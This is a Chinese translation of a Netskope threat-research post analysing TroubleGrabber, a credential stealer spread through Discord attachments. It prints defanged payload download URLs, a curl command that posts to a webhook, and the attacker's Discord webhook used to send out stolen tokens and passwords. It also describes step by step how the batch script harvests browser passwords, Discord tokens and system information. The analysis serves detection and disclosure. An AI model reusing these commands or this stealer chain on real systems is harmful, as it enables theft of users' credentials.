**原文链接：<https://www.netskope.com/blog/here-comes-troublegrabber-stealing-credentials-through-discord>**  
**译者：知道创宇404实验室翻译组**

### 前言

TroubleGrabber是一种新的凭证窃取恶意软件，它通过Discord的附件传播，并使用Discord消息将窃取的凭证传回给攻击者。虽然它在功能上与[AnarchyGrabber](https://www.bleepingcomputer.com/news/security/discord-client-turned-into-a-password-stealer-by-updated-malware/
"AnarchyGrabber")有一些相似之处，但实现方式不同。TroubleGrabber是一个名叫“Itroublve”的人写的，目前被多个攻击者用来针对Discord的受害者。

该恶意软件主要通过drive-by下载，窃取web浏览器令牌、Discord
webhook令牌、web浏览器密码和系统信息。此信息通过webhook作为聊天消息发送到攻击者的Discord服务器。

我们在2020年10月为我们之前的博客文章[《Leaky Chats: Accidental Exposure and Malware in Discord
Attachments》](https://www.netskope.com/blog/leaky-chats-accidental-exposure-and-malware-in-discord-attachments "《Leaky Chats: Accidental Exposure and
Malware in Discord Attachments》")研究公共Discord附件时发现了TroubleGrabber。

### 发现

仅在2020年10月，我们就确定了5700多个公共Discord附件URL，这些URL托管着恶意内容，它们主要以Windows可执行文件和存档的形式存在。同时，我们在恶意软件数据库中扫描了包含Discord
URL的样本，这些URL被用作下一阶段的有效负载或C2。

图1显示了同一时间段内1650个恶意软件样本的前五个检测结果，这些恶意软件样本都是从Discord传递的，并且还包含Discord url。

![](https://images.seebug.org/content/images/2020/11/4e657ed1-329a-4fdb-8c31-910441801a8b.png-w331s)
图1：排名前五位的检测

这些检测与两组不同的恶意软件有关。

  * **GameHack** – Gen：Variant.Mikey.115607，Trojan.GenericKD.43979330是流行游戏的补丁或破解版本。与这些检测相关的所有文件都是通过Discord交付的。
  * **TroubleGrabber** – Gen：Variant.Razy.742965和Gen：Variant.Razy.728469是Gen：Variant.Razy.729793的第一阶段有效负载，这是我们在2020年10月之前从未见过的新恶意软件变体。与这些检测相关的文件使用Discord进行恶意软件交付、下一阶段有效负载和C2通信。

### 攻击描述

TroubleGrabber攻击的可视化描述如图2所示。

![](https://images.seebug.org/content/images/2020/11/d148d3f0-ffdc-4ff7-ad87-df2cff9fb195.png-w331s)
图2:TroubleGrabber攻击

图2中的描述说明了以下步骤：

  * 通过Discord附件链接将TroubleGrabber发送到受害者的机器。
  * TruoubleGrabber使用Discord和Github将下一阶段的有效载荷下载到受害者的机器上。 
  * 有效负载会窃取受害者的凭证，例如系统信息，IP地址，Web浏览器密码和令牌。然后，它通过Webhook URL将它们作为聊天消息发送回攻击者。

### TroubleGrabber分析

我们用于分析的示例托管在Discord
URL中——https://cdn[.]discordapp[.]com/attachments/770854312020410388/770854941614014504/Discord_Nitro_Generator_and_Checker.rar
(md5 –
172c6141eaa2a9b09827d149cb3b05ca)。下载的存档文件`Discord_Nitro_Generator_and_Checker.rar`伪装成Discord
Nitro Generator应用程序。存档包含一个名为`Discord Nitro
Generator`和`Checker.exe`的可执行文件。图3显示了反编译代码的摘录。

![](https://images.seebug.org/content/images/2020/11/d5d6c4c8-1f2a-4cc2-88cf-7354788bbdeb.png-w331s)
图3：Discord Nitro Generator和Checker.exe的反编译代码

图3演示了可执行文件从Discord和Github中托管的7个url下载下一阶段的有效负载到`C:/temp`，如下所示。

    
    
    https://cdn[.]discordapp[.]com/attachments/773838254905622541/773838310610829312/Token_Stealer[.]bat
    https://raw[.]githubusercontent[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer[.]vbs
    https://raw[.]githubusercontent[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer2[.]vbs
    https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView[.]exe?raw=true
    https://raw[.]githubusercontent[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/curl-ca-bundle[.]crt
    https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/curl[.]exe?raw=true
    https://cdn[.]discordapp[.]com/attachments/773838254905622541/773838305497186304/sendhookfile[.]exe

curl.exe，Curl-ca-bundle.crt，WebBrowserPassView.exe，tokenstealer.vbs，Tokenstealer2.vbs，Tokenstealer.bat和sendhookfile.exe的功能如下：

#### Curl.exe

Curl.exe是一个命令行工具，用于通过多种受支持的协议上传，下载和发布数据。该恶意软件使用curl命令通过webhook发布受害者信息的状态消息，如下所示：

    
    
    C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INJECTION STARTED!**\"}" Webhook 

#### Curl-ca-bundle.crt

Curl-ca-bundle.crt是curl用于与远程服务器进行验证的证书。Curl通过使用文件Curl -ca-bundle中提供的公共证书颁发机构来执行SSL证书验证。crt用于上传、下载和发布数据。

#### WebBrowserPassView.exe

WebBrowserPassView.exe是Nirsoft的密码恢复实用程序，用于显示保存在Web浏览器中的密码。该实用程序曾被攻击者用来窃取存储的密码并将其发送回C2。TroubleGrabber使用WebBrowserPassView.exe进行相同的操作。

#### Tokenstealer.vbs

Tokenstealer.vbs是一个Visual
Basic脚本，它从受感染的主机中提取信息，包括产品名称、产品ID和产品密钥，并将其保存在`C:\temp\WindowsInfo.txt`位置。

#### Tokenstealer2.vbs

Tokenstealer2.vbs是一个Visual
Basic脚本，它执行在`C:\temp\finalres.bat`位置中存在的文件。Finalres.bat是tokenstealer.bat的重命名文件。

#### Tokenstealer.bat

Tokenstealer.bat是执行以下操作的批处理文件。

  * 使用https://myexternalip.com/raw查询受害者的外部IP地址，并将其保存到`C:\temp\ip_address.txt`位置
  * 将WebBrowserPassView.exe与`stext`开关一起使用，以显示保存在所有受害者的Web浏览器中的密码，并将其保存到`C:/temp/Passwords.txt`位置
  * 使用Windows系统信息与开关'findstr'和wmic命令查找“域”、“OS名称”、“OS版本”、“系统制造商”、“系统型号”、“系统类型”、“总物理内存”、“磁盘驱动器”、“硬盘驱动器空间”、“序列号”和“cpu名称”，并将其保存到位置`C:\temp\System_INFO.txt`
  * 通过webhook将用户名、时间和日期、IP地址、SystemInfo、Discord、PTB和Canary令牌的curl执行到攻击者的Discord服务器
  * 从位置`C:\temp\`使用开关–processStart执行filed.exe和customeExe.exe
  * 通过使用taskkill和开关`/f/im`，强制杀死Discord.exe，DiscordCanary.exe和DiscordPTB.exe，然后重新启动它们
  * 使用带有开关`/f/q`的del命令删除文件ip_address.txt，WindowsInfo.txt，Passwords.txt，curl-ca-bundle.crt，curl.exe和CustomEXE.exe
  * 使用shutdown命令在30秒内关闭并重新启动计算机

#### Sendhookfile.exe

Sendhookfile.exe是一个可执行文件，可从Web浏览器和本机Discord应用程序中窃取令牌并将其发布到Discord Webhook
URL，即`https://discord[.]com/api/webhooks/770853687592878092/Tt_nUInR-OAYwvSoRbXXJfArRFgMMFTweKLmgJDnS-YyAahH7gKiRCmwE_aG1gIbL0mX`，如图4所示。

![](https://images.seebug.org/content/images/2020/11/f8d7a551-c690-4e37-900b-ecb68c8373ac.png-w331s)
图4：sendhookfile.exe的反编译代码

### 执行问题

在我们的分析过程中，可执行文件在我们的沙盒环境中崩溃，如图5所示。

![](https://images.seebug.org/content/images/2020/11/d72fccff-1aaa-4fb3-83cb-096f817bb169.png-w331s)
图5：Discord Nitro Generator和Checker.exe崩溃

对于我们在分析测试环境中执行的其他几个二进制文件，也看到了相同的崩溃消息。可执行文件崩溃是因为二进制文件是在不支持TLS
1.2的[情况](https://blogs.perficient.com/2016/04/28/tsl-1-2-and-net-support/
"情况")下编译的，而TLS 1.2在.NET 4.5框架中默认情况下不支持。.NET 4.6及更高版本默认情况下支持此功能。

执行后，恶意软件将二进制文件下载到位置`C:\temp`，如图6所示。

![](https://images.seebug.org/content/images/2020/11/0f0f8255-8d22-4844-8a33-190b1bc2437e.png-w331s)
图6：下一阶段的有效负载下载到`C:\temp`位置

该恶意软件还通过Webhooks作为聊天消息发送了所有受害者的凭据，如图7所示。

![](https://images.seebug.org/content/images/2020/11/640b5ba2-96a4-4cca-87b1-9ca033d23573.png-w331s)
图7：凭据通过Webhooks作为聊天消息发送

### Github帐户– Itroublve

`Discord Nitro Generator and
Checker.exe`从Github用户Itroublve在存储库`https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator`中下载了五个下一阶段的有效负载，如图8所示。

![](https://images.seebug.org/content/images/2020/11/59830901-3a8f-4e19-b48f-e152d1059e2d.png-w331s)
图8：令牌浏览器密码创建者的Github存储库

我们从`https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/releases/tag/5.1`位置下载了最新版本`ItroublveTSC V5.1`。该软件包包含恶意软件的生成器及其组件。

### ItroublveTSC_V5.1

该软件包包含一个名为`ItroublveTSC.exe`的可执行文件，该可执行文件用于生成恶意软件及其组件，如图9所示。

![](https://images.seebug.org/content/images/2020/11/7fa852db-fd13-42c6-a911-a0e27db03964.png-w331s) 图9：ItroublveTSC V5.1

生成器工作如下：

发电机的工作原理如下：

  * 用户在`Webhook Here`部分提供他们的Webhook令牌，并单击`Create Stealer Files`复选框。这将生成两个文件，即`sendhookfile.exe`和`Token Stealer.bat`在`ItroublveTSC_V5.1\output`位置。
  * 用户上传`sendhookfile.exe`和`Token Stealer.bat`到任何文件共享应用程序，并将链接粘贴到生成器中。
  * 用户还可以输入假消息框，添加自定义图标，输入文件详细信息，并选择其他选项，包括`Crash PC`、`Auto Remove EXE`、`Restart Discord`、`Restart PC`、`ShutdownPC`和`Custom EXE`。
  * 用户点击`Create Stealer`来生成一个名为`Token Stealer.exe`的文件。在`ItroublveTSC_V5.1`文件夹。

在撰写本文时，生成器中的information选项指向网页https://itroublvehacker[.]ml/howtousev5，没有响应。

我们将TLS 1.2支持添加到二进制代码编译的源代码中，如图10中main()函数的第二行所示，以避免上面提到的执行问题。

![](https://images.seebug.org/content/images/2020/11/62a3874b-0a77-4038-8ef7-fe5da1fa383e.png-w331s)
图10：ItroublveTSC_V5.1的源代码

### Itroublve – OSINT

该恶意软件的原始作者Ithoublve将其绰号粘贴到了生成器和恶意软件中。通过开源情报（OSINT）分析，我们确定了Discord服务器，Facebook页面，Twitter，Instagram，网站，电子邮件地址和YouTube频道的“Itroublve”。Itroublve在Facebook的一篇帖子中提到YouTube频道已终止，因此创建了一个新频道。在撰写本文时，Itroublve的Discord服务器具有573个成员，如图11所示。

![](https://images.seebug.org/content/images/2020/11/8ebc591e-8f6b-47aa-b119-95f2fe05a0b2.png-w331s)
图11：Itroublve的Discord服务器

YouTube页面包含ItroublveTSC生成器用法的演示，其中Itroublve演示了如何将文件`Token
Stealer.bat`和`Sendhookfile.exe`上载到Discord，并生成公共链接以进入复选框，如图12所示。

![](https://images.seebug.org/content/images/2020/11/fae8d21e-4458-4b23-ba09-9e270a02de03.png-w331s)
图12：为“Token Stealer.bat”和“Sendhookfile.exe”生成公共链接

我们的分析表明，很多黑客都遵循了这个确切的教程，这从用于托管生成的恶意软件的不同Discord服务器的数量中可以明显看出。

### 观察结果

TroubleGrabber是恶意软件的最新示例，该恶意软件在攻击的每个阶段都滥用云应用程序。具体来说，TroubleGrabber使用四种常用技术：

  * **使用云应用进行首次交付** ——攻击者选择了可能被其目标广泛使用的云应用。
  * **使用云应用程序进行下一阶段的有效负载交付** ——攻击者越来越多地使用云应用程序来下载第二个有效负载，再次使用在其目标中很流行并因此有可能被允许的应用程序。 
  * **使用云应用程序进行命令和控制** ——像初始交付和下一阶段的有效负载交付一样，使用在目标中最受欢迎的应用程序可以帮助攻击者逃避检测。 
  * **窃取云应用程序凭据** ——这可能意味着用户名和密码或令牌可能被盗。凭证被盗的原因多种多样，包括监视受害者或从受害者帐户发起其他攻击。 

TroubleGrabber与其他密码和令牌盗窃者组织有相似之处，比如[AnarchyGrabber](https://www.bleepingcomputer.com/news/security/discord-client-turned-into-a-password-stealer-by-updated-malware/
"AnarchyGrabber")，一种窃取密码和用户令牌，禁用2FA，并将恶意软件传播到受害者的Discord服务器的恶意软件。

我们确定了1000多个生成的二进制文件，这些二进制文件是通过驱动下载URL分发的，这些文件名伪装成游戏作弊、不和谐安装程序和软件漏洞。图13显示该文件主要是通过Discord分发的，少量文件是通过anonfiles.com和onymousfiles.io分发的，这些服务允许用户匿名上传文件并免费生成公共下载链接。

![](https://images.seebug.org/content/images/2020/11/46d6a372-a8c0-4493-a1a2-85fd53a4ea24.png-w331s)
图13：TroubleGrabber驱动下载URL

除此之外，我们还确定了从700多个不同的Discord服务器通道ID的恶意软件。

### 结论

TroubleGrabber，一种新的凭据窃取程序，是攻击者使用云应用程序滥用用户在这些应用程序中放置的信任并逃避检测的趋势的又一个示例。该恶意软件使用Discord和Github交付下一阶段的有效负载，并使用Discord
Webhooks作为C2发送受害者凭证。

与TroubleGrabber相关的危害指标（IOC）可在Github上获得–
<https://github.com/netskopeoss/NetskopeThreatLabsIOCs/tree/main/TroubleGrabber>。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1399/>

